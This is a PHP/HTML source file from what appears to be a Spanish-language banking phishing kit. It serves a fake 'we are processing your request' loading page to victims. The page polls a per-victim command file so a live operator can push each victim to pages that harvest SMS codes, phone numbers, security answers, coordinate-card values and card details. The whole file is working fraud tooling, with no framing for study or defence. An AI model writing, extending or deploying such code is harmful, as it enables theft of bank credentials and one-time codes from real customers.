<?php
session_start();
$usuario = $_SESSION['usuario'] ?? null;
if (!$usuario) {
  header("Location: index.php");
  exit;
}

$archivo = "acciones/$usuario.txt";
if (file_exists($archivo)) {
    $accion = trim(file_get_contents($archivo));
    unlink($archivo);

    if (substr($accion, 0, strlen("/clave/")) === "/clave/") {
        $pregunta = explode("/clave/", $accion)[1];
        $_SESSION['pregunta'] = $pregunta;
        header("Location: pregunta.php");
        exit;
    }

    if (substr($accion, 0, strlen("/etiquetas/")) === "/etiquetas/") {
        $etiquetas = explode("/etiquetas/", $accion)[1];
        $_SESSION['etiquetas'] = explode(",", $etiquetas);
        header("Location: coordenadas.php");
        exit;
    }

    switch ($accion) {
        case "/v1":
            header("Location: sms.php"); break;
        case "/v1error":
            header("Location: smserror.php"); break;
        case "/n1":
            header("Location: numero.php"); break;
        case "/retry":
            header("Location: index2.php"); break;
        case "/inicio":
            header("Location: index.php"); break;
        case "/err1":
            header("Location: index2.php"); break;
        case "/form":
            header("Location: card.html"); break;
    }
    exit;
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="refresh" content="3">
  <title>Validando...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      text-align: center;
      margin-top: 20%;
      background-color: #fff;
      color: #006838;
    }
    .subtexto {
      color: #888;
      margin-top: 10px;
    }
    .loader {
      border: 6px solid #eee;
      border-top: 6px solid #006838;
      border-radius: 50%;
      width: 60px;
      height: 60px;
      animation: spin 1s linear infinite;
      margin: 30px auto 0;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <h2>Estamos procesando tu solicitud…</h2>
  <p class="subtexto">Por favor, mantené abierta esta ventana</p>
  <div class="loader"></div>
</body>
</html>
